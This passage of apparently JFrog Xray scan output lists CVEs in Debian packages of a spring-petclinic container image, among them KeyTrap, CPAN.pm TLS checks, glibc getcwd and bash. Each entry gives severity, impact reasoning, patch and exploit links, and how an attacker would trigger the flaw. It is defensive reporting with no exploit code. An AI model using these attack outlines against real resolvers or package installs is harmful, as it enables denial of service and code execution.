            "Resolution": "##### Deployment mitigations\n\nSince the vulnerability affects many different DNS resolvers, remediation is on a case-by-case basis.",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A PoC was published, demonstrating denial of service.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
                  "Description": "To exploit the vulnerability, an attacker needs to make the victim resolver validate his malicious domain.\nNote - This flaw is derived from the DNSSEC standard, thus every implementation of DNSSEC that follows the standard is vulnerable.",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The attacker needs to send a DNS query to the target resolver, requesting his malicious domain. The attack occurs when the resolver tries to validate the response from the DNS server.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Exploitation of the vulnerability causes high resource consumption, which leads to denial of service.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "A technically detailed writeup of this vulnerability (under the name \"keytrap\") was published by the research team, ATHENE-RESEARC.",
                  "IsPositive": 0,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Unbound's patch for this vulnerability",
                  "Url": "https://github.com/NLnetLabs/unbound/commit/882903f2fa800c4cb6f5e225b728e2887bb7b9ae",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Vulnerability writeup by the research team",
                  "Url": "https://www.athene-center.de/en/keytrap",
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Ubuntu advisory",
                  "Url": "https://ubuntu.com/security/CVE-2023-50387",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Public \"educational\" exploit",
                  "Url": "https://github.com/knqyf263/CVE-2023-50387",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
            "cve_id": "CVE-2023-50387",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Use of dnssec validation was not found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
            "vulnerability_id": "CVE-2023-50387",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-590537",
         "severity": "High",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Certain DNSSEC aspects of the DNS protocol (in RFC 4033, 4034, 4035, 6840, and related RFCs) allow remote attackers to cause a denial of service (CPU consumption) via one or more DNSSEC responses, aka the \"KeyTrap\" issue. One of the concerns is that, when there is a zone with many DNSKEY and RRSIG records, the protocol specification implies that an algorithm must evaluate all combinations of DNSKEY and RRSIG records.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsystemd0",
         "source_id": "deb://debian:bullseye:libsystemd0",
         "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "< 247.3-7+deb11u6"
            ],
            "fixed_versions": [
               "247.3-7+deb11u6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-50387",
                     "cwe": [
                        "CWE-770"
                     ],
                     "cwe_details": {
                        "CWE-770": {
                           "name": "Allocation of Resources Without Limits or Throttling",
                           "description": "The product allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Certain DNSSEC aspects of the DNS protocol (in RFC 4033, 4034, 4035, 6840, and related RFCs) allow remote attackers to cause a denial of service (CPU consumption) via one or more DNSSEC responses, aka the \"KeyTrap\" issue. One of the concerns is that, when there is a zone with many DNSKEY and RRSIG records, the protocol specification implies that an algorithm must evaluate all combinations of DNSKEY and RRSIG records.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-590537",
            "VulnerabilityTitle": "KeyTrap",
            "ShortDescription": "Unbounded resource consumption in the DNSSEC extension of the DNS protocol may lead to denial of service when resolving a malicious domain.",
            "FullDescription": "",
            "Impact": 6,
            "VulnerabilityType": "Denial of service",
            "Resolution": "##### Deployment mitigations\n\nSince the vulnerability affects many different DNS resolvers, remediation is on a case-by-case basis.",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A PoC was published, demonstrating denial of service.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
                  "Description": "To exploit the vulnerability, an attacker needs to make the victim resolver validate his malicious domain.\nNote - This flaw is derived from the DNSSEC standard, thus every implementation of DNSSEC that follows the standard is vulnerable.",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The attacker needs to send a DNS query to the target resolver, requesting his malicious domain. The attack occurs when the resolver tries to validate the response from the DNS server.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Exploitation of the vulnerability causes high resource consumption, which leads to denial of service.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "A technically detailed writeup of this vulnerability (under the name \"keytrap\") was published by the research team, ATHENE-RESEARC.",
                  "IsPositive": 0,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Unbound's patch for this vulnerability",
                  "Url": "https://github.com/NLnetLabs/unbound/commit/882903f2fa800c4cb6f5e225b728e2887bb7b9ae",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Vulnerability writeup by the research team",
                  "Url": "https://www.athene-center.de/en/keytrap",
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Ubuntu advisory",
                  "Url": "https://ubuntu.com/security/CVE-2023-50387",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Public \"educational\" exploit",
                  "Url": "https://github.com/knqyf263/CVE-2023-50387",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
            "cve_id": "CVE-2023-50387",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Use of dnssec validation was not found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
            "vulnerability_id": "CVE-2023-50387",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-515823",
         "severity": "High",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "CPAN.pm before 2.35 does not verify TLS certificates when downloading distributions over HTTPS.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:perl-base",
         "source_id": "deb://debian:bullseye:perl-base",
         "source_comp_id": "deb://debian:bullseye:perl-base:5.32.1-4+deb11u2",
         "component_versions": {
            "id": "debian:bullseye:perl",
            "vulnerable_versions": [
               "< 5.32.1-4+deb11u4"
            ],
            "fixed_versions": [
               "5.32.1-4+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-31484",
                     "cwe": [
                        "CWE-295"
                     ],
                     "cwe_details": {
                        "CWE-295": {
                           "name": "Improper Certificate Validation",
                           "description": "The product does not validate, or incorrectly validates, a certificate."
                        }
                     },
                     "cvss_v3": "8.1/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "CPAN.pm before 2.35 does not verify TLS certificates when downloading distributions over HTTPS.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-515823",
            "VulnerabilityTitle": "",
            "ShortDescription": "Missing TLS check in CPAN.pm allows man-in-the-middle attacks when downloading packages and may lead to code execution.",
            "FullDescription": "[CPAN.pm](https://metacpan.org/pod/CPAN) is a Perl module and command-line tool that provides an automated and standardized way to download, install, and manage Perl modules and their dependencies from the Comprehensive Perl Archive Network (CPAN).\n[HTTP::Tiny](https://metacpan.org/pod/HTTP::Tiny) is an HTTP client in Perl and a standalone CPAN module. By default, it does not verify TLS certificates. To enable it, the `verify_SSL=>1` flag should be specified when initializing the `HTTP::Tiny` object. The problem identified in `HTTP::Tiny` has been assigned the CVE identifier `CVE-2023-31486` and serves as the underlying cause for the problem in `CPAN.pm`.\n\n`CPAN.pm` downloads and executes code through the `install` command followed by the package name.\nAlthough `CPAN.pm` downloads from `https://cpan.org`, it does not enable TLS certificate verification while using `HTTP::Tiny`, which could potentially allow an attacker to perform a man-in-the-middle attack by injecting malicious data that could be executed by CPAN.pm.\n\nExample of a vulnerable code:\n```\nuse CPAN;\ninstall DateTime\n```\n\nExample of a vulnerable command-line:\n```\ncpan install DateTime\n```",
            "Impact": 6,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 5
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "Exploitation only requires an attacker to perform a man-in-the-middle attack (which is extensively documented) and provide the victim with a malicious package instead of the legitimate one.",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "This issue may lead to code execution.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "A technical write-up exists.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker should be in the network to perform a man-in-the-middle attack, and then provide a malicious package when the victim installs a new CPAN.pm package.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "GitHub Issue",
                  "Url": "https://github.com/chansen/p5-http-tiny/issues/152",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/andk/cpanpm/commit/9c98370287f4e709924aee7c58ef21c85289a7f0",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical write-up",
                  "Url": "https://blog.hackeriet.no/perl-http-tiny-insecure-tls-default-affects-cpan-modules/",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:perl-base:5.32.1-4+deb11u2",
            "cve_id": "CVE-2023-31484",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user use the \"cpan\" CLI tool to install a (Pelr) CPAN package.",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:perl-base:5.32.1-4+deb11u2",
            "vulnerability_id": "CVE-2023-31484",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-194496",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A flaw was found in glibc. An off-by-one buffer overflow and underflow in getcwd() may lead to memory corruption when the size of the buffer is exactly 1. A local attacker who can control the input buffer and size passed to getcwd() in a setuid program could use this flaw to potentially execute arbitrary code and escalate their privileges on the system.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u4"
            ],
            "fixed_versions": [
               "2.31-13+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-3999",
                     "cwe": [
                        "CWE-193"
                     ],
                     "cwe_details": {
                        "CWE-193": {
                           "name": "Off-by-one Error",
                           "description": "A product calculates or uses an incorrect maximum or minimum value that is 1 more, or 1 less, than the correct value."
                        }
                     },
                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A flaw was found in glibc. An off-by-one buffer overflow and underflow in getcwd() may lead to memory corruption when the size of the buffer is exactly 1. A local attacker who can control the input buffer and size passed to getcwd() in a setuid program could use this flaw to potentially execute arbitrary code and escalate their privileges on the system.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-194496",
            "VulnerabilityTitle": "",
            "ShortDescription": "Off-by-one buffer overflow in glibc getcwd() can lead to code execution when the working directory's path exceeds PATH_MAX characters.",
            "FullDescription": "The [GNU C Library](https://www.gnu.org/s/libc/), commonly known as glibc, is the GNU Project's implementation of the C standard library.\n\nglibc's `getcwd(buf, size)` method copies an absolute pathname of the current working directory to the `buf` argument. When the working directory's path is longer than `PATH_MAX`, if and only if the `size` of `buf` is exactly `1`, an [off-by-one buffer overflow](https://csl.com.co/en/off-by-one-explained/) will be triggered which may lead to code execution.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "Although a technical writeup exists, no exploit code has been shown to exploit the off-by-one overflow for code execution, which is a non-trivial task",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find a remote input that propagates into the `getcwd()` method, with the attacker controlling the `size` parameter (highly unlikely) where the process' working directory path exceeds `PATH_MAX` characters",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "To trigger this vulnerability: \n- The working directory's path should exceed `PATH_MAX` characters,\n- The attacker should be able to execute `chdir()` locally on the `/` directory or (even more unlikely) to bind-mount the `/` directory to the directory longer than `PATH_MAX`,\n- The `size` of `buf` should be exactly `1`.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Code execution",
                  "IsPositive": 0,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical Writeup",
                  "Url": "https://www.openwall.com/lists/oss-security/2022/01/24/4",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=23e0e8f5f1fb5ed150253d986ecccdc90c2dcd5e",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "cve_id": "CVE-2021-3999",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "The vulnerable function getcwd is called from a SUID binary, however applicability depends on interactive conditions (see scanner explanation)",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "vulnerability_id": "CVE-2021-3999",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-194496",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A flaw was found in glibc. An off-by-one buffer overflow and underflow in getcwd() may lead to memory corruption when the size of the buffer is exactly 1. A local attacker who can control the input buffer and size passed to getcwd() in a setuid program could use this flaw to potentially execute arbitrary code and escalate their privileges on the system.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u4"
            ],
            "fixed_versions": [
               "2.31-13+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-3999",
                     "cwe": [
                        "CWE-193"
                     ],
                     "cwe_details": {
                        "CWE-193": {
                           "name": "Off-by-one Error",
                           "description": "A product calculates or uses an incorrect maximum or minimum value that is 1 more, or 1 less, than the correct value."
                        }
                     },
                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A flaw was found in glibc. An off-by-one buffer overflow and underflow in getcwd() may lead to memory corruption when the size of the buffer is exactly 1. A local attacker who can control the input buffer and size passed to getcwd() in a setuid program could use this flaw to potentially execute arbitrary code and escalate their privileges on the system.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-194496",
            "VulnerabilityTitle": "",
            "ShortDescription": "Off-by-one buffer overflow in glibc getcwd() can lead to code execution when the working directory's path exceeds PATH_MAX characters.",
            "FullDescription": "The [GNU C Library](https://www.gnu.org/s/libc/), commonly known as glibc, is the GNU Project's implementation of the C standard library.\n\nglibc's `getcwd(buf, size)` method copies an absolute pathname of the current working directory to the `buf` argument. When the working directory's path is longer than `PATH_MAX`, if and only if the `size` of `buf` is exactly `1`, an [off-by-one buffer overflow](https://csl.com.co/en/off-by-one-explained/) will be triggered which may lead to code execution.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "Although a technical writeup exists, no exploit code has been shown to exploit the off-by-one overflow for code execution, which is a non-trivial task",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find a remote input that propagates into the `getcwd()` method, with the attacker controlling the `size` parameter (highly unlikely) where the process' working directory path exceeds `PATH_MAX` characters",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "To trigger this vulnerability: \n- The working directory's path should exceed `PATH_MAX` characters,\n- The attacker should be able to execute `chdir()` locally on the `/` directory or (even more unlikely) to bind-mount the `/` directory to the directory longer than `PATH_MAX`,\n- The `size` of `buf` should be exactly `1`.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Code execution",
                  "IsPositive": 0,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical Writeup",
                  "Url": "https://www.openwall.com/lists/oss-security/2022/01/24/4",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=23e0e8f5f1fb5ed150253d986ecccdc90c2dcd5e",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "cve_id": "CVE-2021-3999",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "The vulnerable function getcwd is called from a SUID binary, however applicability depends on interactive conditions (see scanner explanation)",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "vulnerability_id": "CVE-2021-3999",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-261115",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A flaw was found in the bash package, where a heap-buffer overflow can occur in valid parameter_transform. This issue may lead to memory problems.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:bash",
         "source_id": "deb://debian:bullseye:bash",
         "source_comp_id": "deb://debian:bullseye:bash:5.1-2+b3",
         "component_versions": {
            "id": "debian:bullseye:bash",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-3715",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A flaw was found in the bash package, where a heap-buffer overflow can occur in valid parameter_transform. This issue may lead to memory problems.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-22T22:11:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-261115",
            "VulnerabilityTitle": "",
            "ShortDescription": "Out-of-bound read in Bash can lead to denial of service when processing a crafted parameter expansion.",
            "FullDescription": "[Bash](https://www.gnu.org/software/bash/) is a Unix shell, which is a command-line interface for interacting with an operating system. It is the default shell for most Linux distributions. Bash allows users to execute commands, manipulate files, and run scripts to automate tasks.\n\nWhen bash is compiled with [ASAN (AdressSanitizer)](https://github.com/google/sanitizers/wiki/AddressSanitizer), a script using a crafted [Shell parameter expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html) of type `${parameter@operator}` can lead to out-of-bound read of 1 byte. \nIn some circumstances (ex. Bash is compiled with ASAN) this can crash the bash process, but triggering a crash is unlikely in real-world scenarios.\n\nThe attackers must find a remote input that propagates to a bash script using this special parameter expansion which is not easy at all and very unlikely.",
            "Impact": 4,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "Attackers can simply create a parameter transformation on a variable that contains the same parameter transformation",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "In some circumstances (ex. Bash is compiled with ASAN) exploiting this issue can crash the bash process, but triggering a crash is unlikely in real-world scenarios.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attackers must find a remote input that propagates to a bash script using the special parameter expansion `${parameter@operator}` where the parameter is taken from a user-controlled input. \nThis is extremely unlikely to happen in a remote scenario.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Official discussion about the issue",
                  "Url": "https://lists.gnu.org/archive/html/bug-bash/2022-08/msg00147.html",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:bash:5.1-2+b3",
            "cve_id": "CVE-2022-3715",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the user must use a Bash parameter expansion \"${SOMEVAR@operator}\" with an attacker-controlled SOMEVAR variable",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:bash:5.1-2+b3",
            "vulnerability_id": "CVE-2022-3715",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-208564",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "ncurses 6.3 before patch 20220416 has an out-of-bounds read and segmentation violation in convert_strings in tinfo/read_entry.c in the terminfo library.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libtinfo6",
         "source_id": "deb://debian:bullseye:libtinfo6",
         "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
         "component_versions": {
            "id": "debian:bullseye:ncurses",
            "vulnerable_versions": [
               "< 6.2+20201114-2+deb11u1"
            ],
            "fixed_versions": [
               "6.2+20201114-2+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-29458",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
